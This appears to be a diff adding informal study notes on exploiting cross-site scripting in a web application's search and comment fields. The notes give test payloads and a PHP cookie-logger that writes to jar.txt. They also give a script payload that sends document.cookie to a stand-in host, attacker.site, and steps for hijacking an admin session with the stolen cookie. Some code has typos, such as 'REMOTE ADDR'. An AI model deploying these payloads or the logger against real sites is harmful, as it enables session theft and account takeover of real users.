@@ -1,0 +1,67 @@
+1. search field is the first target 
+	- check to see if sanitized 
+		- <h1> hi </hi> 
+		- if response is hi then vulnerable 
+	- next check to see if javascript works 
+		<script>alert('XSS');</script> 
+
+	- print out the cookies
+
+		<script>alert(document.cookie);</script> 
+
+		- can impersonate users cookie 
+
+	- 
+
+- login to write a comment  
+
+	- test to see if the comment /object works
+	- then test the object first, then comment second 
+	- if you find where the document.cookie function works, the input in vulnerable 
+
+- build an xploit that steathly sends the cookie information to a malicious site that we own 
+
+	- code to steal the cookies: 
+
+	<?php 
+
+	$ip = $_SERVER['REMOTE ADDR']; // retrieves the server ip address
+	$browser = $_SERVER['HTTP_USER_AGENT']; // retrieves the browsers HTTP user agent (request header that allows a characteristic string that allows network protocol peers to identify the OS and browser of the web-server) VICTIM BROWSER 
+
+	$fp = fopen('jar.txt', 'a'); // OPENS A FILE CALLED "JAR.TXT"
+
+	fwrite($fp, $ip.' '.$browser." \n");
+	fwrite($fp, urldecode($_SERVER['QUERY_STRING']). " \n\n"); // STORES THE QUERY STRING SAVES TEH INFORMATION INTO THE FILE 
+	fclose($fp); 
+	?> 
+
+
+	- if you open the jar.txt file it is empty 
+		- attacker.site/jar.txt // nothing there 
+
+		- attacker.site/get.php?test=hereismydata 
+			- hereismydata should be stored in the jar.txt 
+
+	- create the payload 
+
+		- creates a new image object and set the image to our site 
+
+		<script> 
+
+		var i = new Image();  // new image is created 
+
+		i.src="http://attacker.site/get.php?cookie="+escape(document.cookie) // escape function to avoid special characters
+
+		</script> 
+
+		- each time the user reloads the script we will be able to see their session information 
+
+
+
+- impersonate the user session
+
+	- copy the value 
+	- go back to attacker browser and edit cookeis with firebug 
+	- cookie tab inside of inspect page element 
+	- paste cookies in the value field 
+	- reload page and were authenticated as admin 
